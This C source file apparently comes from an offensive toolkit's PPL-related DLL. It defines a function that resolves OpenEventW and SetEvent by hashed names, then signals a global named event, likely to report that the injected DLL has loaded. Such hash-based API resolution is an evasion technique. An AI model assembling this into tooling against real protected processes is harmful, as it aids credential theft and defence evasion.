#include "ppl/ppl_medic_dll.h"

BOOL signal_dll_load_event(
    IN LPWSTR event_name)
{
    BOOL   ret_val       = FALSE;
    BOOL   success       = FALSE;
    HANDLE hEvent        = NULL;
    LPWSTR pwszEventName = NULL;

    OpenEventW_t OpenEventW = NULL;
    SetEvent_t   SetEvent   = NULL;

    OpenEventW = (OpenEventW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        OpenEventW_SW2_HASH,
        0);
    if (!OpenEventW)
    {
        api_not_found("OpenEventW");
        goto cleanup;
    }

    SetEvent = (SetEvent_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        SetEvent_SW2_HASH,
        0);
    if (!SetEvent)
    {
        api_not_found("SetEvent");
        goto cleanup;
    }

    pwszEventName = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszEventName)
    {
        malloc_failed();
        goto cleanup;
    }

    swprintf_s(pwszEventName, MAX_PATH, L"Global\\%ws", event_name);

    hEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, pwszEventName);
    if (!hEvent)
    {
        function_failed("OpenEventW");
        goto cleanup;
    }

    success = SetEvent(hEvent);
    if (!success)
    {
        function_failed("SetEvent");
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    if (hEvent)
        NtClose(hEvent);
    if (pwszEventName)
        intFree(pwszEventName);

    return ret_val;
}
